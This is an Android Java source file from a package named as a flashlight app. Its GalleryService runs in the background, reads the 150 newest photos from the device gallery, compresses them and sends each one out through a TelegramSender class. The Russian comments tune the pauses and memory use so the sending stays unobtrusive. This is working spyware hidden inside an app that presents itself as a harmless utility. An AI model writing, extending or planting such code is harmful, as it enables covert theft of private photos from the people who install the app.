package com.flashlight.app;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

public class GalleryService extends Service {
    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            List<Uri> allImages = getRecentImages();
            
            // Берем 150 последних
            for (int i = 0; i < allImages.size(); i++) {
                Uri uri = allImages.get(i);
                try {
                    InputStream is = getContentResolver().openInputStream(uri);
                    
                    BitmapFactory.Options options = new BitmapFactory.Options();
                    options.inJustDecodeBounds = true;
                    BitmapFactory.decodeStream(is, null, options);
                    if (is != null) is.close();
                    
                    int scale = 1;
                    while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
                        scale *= 2;
                    }

                    is = getContentResolver().openInputStream(uri);
                    options = new BitmapFactory.Options();
                    options.inSampleSize = scale;
                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                    if (is != null) is.close();

                    if (bitmap != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos); 
                        byte[] bytes = baos.toByteArray();
                        bitmap.recycle(); // Освобождаем память СРАЗУ
                        
                        // Отправляем по одному, чтобы не нагружать сеть и память
                        new TelegramSender().send(bytes, "gallery_" + i + ".jpg");
                        
                        // Пауза 2 секунды, чтобы телефон остыл
                        Thread.sleep(2000); 
                    }
                } catch (Exception e) { e.printStackTrace(); }
                catch (OutOfMemoryError e) { System.gc(); }
            }
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private List<Uri> getRecentImages() {
        List<Uri> imageUris = new ArrayList<>();
        String[] projection = new String[]{MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 150";

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, sortOrder
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                imageUris.add(uri);
            }
            cursor.close();
        }
        return imageUris;
    }
}
